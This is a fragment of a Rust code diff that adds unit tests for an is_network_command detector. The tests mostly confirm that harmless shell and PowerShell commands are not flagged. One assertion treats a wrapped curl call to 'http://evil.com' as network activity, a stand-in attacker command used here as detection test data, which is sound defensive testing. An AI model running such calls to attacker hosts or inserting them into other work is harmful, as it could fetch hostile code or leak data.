+        assert!(!is_network_command("cmd /c dir"));
+        assert!(!is_network_command("powershell -Command \"Get-ChildItem\""));
+        assert!(!is_network_command("pwsh -Command \"Write-Output hello\""));
+        // Shell wrapper wrapping a network tool → still flagged by the tool
         assert!(is_network_command("bash -c \"curl http://evil.com\""));
-        // Non-network commands still pass
-        assert!(!is_network_command("echo hello"));
+    }
+
+    #[test]
+    fn is_network_command_allows_non_network() {
         assert!(!is_network_command("ls -la"));
+        assert!(!is_network_command("echo hello"));
+        assert!(!is_network_command("cargo build"));
+        assert!(!is_network_command("npm test"));
+        assert!(!is_network_command("bash -c \"npm run build\""));
     }
 }
